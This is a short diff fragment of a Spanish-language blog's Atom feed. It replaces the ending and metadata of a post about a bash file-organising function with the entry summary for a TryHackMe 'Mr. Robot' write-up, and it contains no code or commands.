-
-&lt;p&gt;Si logro mejorar en bash, vamos publicando poco a poco cosas de este estilo, es una ventaja que podamos crear nuestros propios programas para mejorar nuestra calidad de aprendizaje.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Bash" /><category term="Script" /><summary type="html">Vamos a crear la función mkhack para organizar nuestros ficheros. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="MrRobot" /><summary type="html">Vamos a resolver la maquina Mr. Robot de TryHackMe. ¡Let's hack!</summary></entry></feed>
